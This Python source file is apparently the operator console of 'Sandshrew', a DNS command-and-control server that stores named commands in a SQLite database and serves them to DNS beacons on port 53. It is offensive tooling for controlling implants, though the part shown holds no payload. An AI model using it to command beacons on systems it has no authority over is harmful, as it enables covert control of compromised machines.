"""
    Custom python server to handle DNS requests and 
    create custom responses to queries. Used primarily 
    to control DNS Beacons.

    @author Dosh, JRoc
    github.com/doshmajhan/Sandshrew
"""
import threading, sys, sqlite3
import server

"""
    Function to start interactive prompt to read commands

"""
def start_prompt():
    port = 53   # Default value
    cmd = ""
    s = server.Server(port)
    db = sqlite3.connect("sandtomb.db")
    c = db.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                    (name TEXT, cmd TEXT)''')
    db.commit()
    while True:
        try:
            cmd = raw_input("[*] ")
        except (KeyboardInterrupt, SystemExit):
            print ""
            sys.exit()
        
        cmd = cmd.split(" ")
        if cmd[0] == "start":  # starting server
            s = start_server(port)
        elif cmd[0] == "exit":   # shutting server down
            sys.exit()

        elif cmd[0] == "port":  # defining port to listen on
            port = int(cmd[1])

        elif cmd[1] == "=":     # defining new command to store
            name = cmd[0]
            newCmd = ' '.join(cmd[2::])
            s.add_command(name, newCmd, db)
        elif cmd[0] == "load":  # load defined command into server
            s.load_command(cmd[1], db)
"""
    Function to handle the start command.
    Starts server and returns the server object created
    
    port - the port to listen on 

    returns a server object
"""
def start_server(port):
    s = server.Server(port)
    server_thread = threading.Thread(target=s.start)
    server_thread.daemon=True
    try:
        server_thread.start()
        print "Server listening on port %d" % port
    except (KeyboardInterrupt, SystemExit):
        sys.exit()
    return s

"""
    Main program to start the server and receive requests
"""
if __name__ == "__main__":
        print "- Starting prompt..."
        start_prompt()
        sys.exit()
